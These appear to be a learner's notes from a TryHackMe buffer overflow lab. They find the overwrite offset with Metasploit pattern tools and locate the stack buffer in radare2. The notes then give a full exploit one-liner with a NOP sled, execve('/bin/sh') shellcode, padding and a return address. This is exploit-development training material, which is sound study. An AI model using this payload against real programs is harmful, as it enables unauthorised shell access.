**Find offset**

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`

- Use as input for program
- Find offset of stack frame pointer (rbp)
```
> r2 -d buffer_overflow [pattern]
> aa
> dr
``` 
- Use `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [pattern found in rbp]`
  (Keep Little Endianness in mind)
- Offset of pattern is 144


**Find address of buffer**
Provide argument `AAAA` to program

```
> r2 -d buffer_overflow AAAA
> aa
> pdf @sym.copy_arg
> db [address of 'call sym.imp.puts]
> dc
> afvd
```
var var90_h seems to hold our value, so this must be the buffer

You can also find the address of the buffer by looking at the memory area around the stack pointer (radare2):
`px @rsp` 

![Address of buffer](./img/buffer_address.png)
![Memory around stack pointer](./img/stack_memory.png)

Fill the ebp with this value:

`python -c "print(NOP * some amount + shell code (30 bytes) + random data to fill up to 144 bytes + buffer address)"`  

`python -c "print('\x90' * 90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 22 + '\x50\xe2\xfe\xff\xff\xff\xf7')"`







badchars: \x3b ---> WTF? Ask TryHackMe community?